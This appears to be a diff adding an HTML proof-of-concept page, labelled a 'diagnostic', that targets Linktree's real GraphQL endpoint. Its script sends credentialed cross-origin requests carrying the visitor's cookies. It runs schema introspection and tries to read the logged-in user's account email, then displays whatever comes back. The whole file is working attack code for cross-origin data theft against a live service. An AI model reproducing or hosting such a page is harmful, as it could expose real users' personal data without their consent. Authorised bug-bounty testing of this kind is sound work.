@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px;">
+    <h2>Linktree GraphQL Diagnostic PoC</h2>
+    <button onclick="diagnose()" style="padding:10px 20px; cursor:pointer;">Run Deep Diagnostic</button>
+    <div id="log" style="margin-top:20px; border:1px solid #30363d; padding:15px; background:#161b22;">Waiting...</div>
+
+    <script>
+        async function diagnose() {
+            const log = document.getElementById("log");
+            log.innerHTML = "[*] Starting Diagnostic...\n";
+
+            // 1. اختبار الاتصال الأساسي ومعرفة الـ Type الحالي
+            const basicQuery = "query { __typename }";
+            
+            // 2. محاولة استكشاف الحقول المتاحة (Introspection Light)
+            const introspectQuery = "query { __schema { queryType { fields { name } } } }";
+
+            const queries = [
+                { name: "Basic Typename", q: basicQuery },
+                { name: "Introspection", q: introspectQuery },
+                { name: "Account Query", q: "query { account { email } }" },
+                { name: "Self Query", q: "query { self { email } }" }
+            ];
+
+            for (let item of queries) {
+                log.innerHTML += `\n[*] Testing: ${item.name}... `;
+                try {
+                    const response = await fetch(`https://graph.linktr.ee/graphql?query=${encodeURIComponent(item.q)}`, {
+                        method: 'GET',
+                        credentials: 'include' // أهم جزء لإرسال الكوكيز
+                    });
+                    const data = await response.json();
+                    
+                    if (data.data) {
+                        log.innerHTML += "<b style='color:#7ee787'>SUCCESS!</b>";
+                        log.innerHTML += "\n<pre>" + JSON.stringify(data.data, null, 2) + "</pre>";
+                    } else {
+                        log.innerHTML += "<b style='color:#f85149'>FAILED</b> (GraphQL Error)";
+                    }
+                } catch (err) {
+                    log.innerHTML += "<b style='color:#f85149'>CONNECTION ERROR</b> (CORS Blocked)";
+                }
+            }
+        }
+    </script>
+</body>
+</html>
